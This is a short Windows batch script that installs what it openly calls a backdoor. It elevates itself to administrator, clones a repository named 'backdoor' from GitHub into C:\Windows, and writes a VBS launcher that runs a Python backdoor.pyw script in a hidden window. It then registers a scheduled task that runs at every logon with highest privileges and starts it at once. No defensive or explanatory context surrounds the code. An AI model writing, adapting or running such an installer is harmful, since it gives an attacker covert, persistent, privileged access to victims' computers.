@echo off

net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

schtasks /delete /tn "backdoor_up_2" /f

TASKKILL /F /IM pythonw.exe
rmdir "C:\Windows\backdoor" /s /q


git clone https://github.com/Jevelin4k/backdoor/ C:\Windows\backdoor\v2.0
echo Set WshShell = CreateObject("WScript.Shell") > C:\Windows\backdoor\v2.0\v2.0\up_2.vbs
echo WshShell.Run "cmd.exe /c C:\Windows\backdoor\v2.0\v2.0\up_2.bat", 0, False >> C:\Windows\backdoor\v2.0\v2.0\up_2.vbs
echo @echo off > C:\Windows\backdoor\v2.0\v2.0\up_2.bat
echo pythonw C:\Windows\backdoor\v2.0\v2.0\backdoor.pyw >> C:\Windows\backdoor\v2.0\v2.0\up_2.bat
schtasks /create /tn "backdoor_up_2" /tr "C:\Windows\backdoor\v2.0\v2.0\up_2.vbs" /sc onlogon /rl highest /f

cd C:\Windows\backdoor\v2.0\v2.0\

call pip_install.bat


schtasks /run /tn "backdoor_up_2"
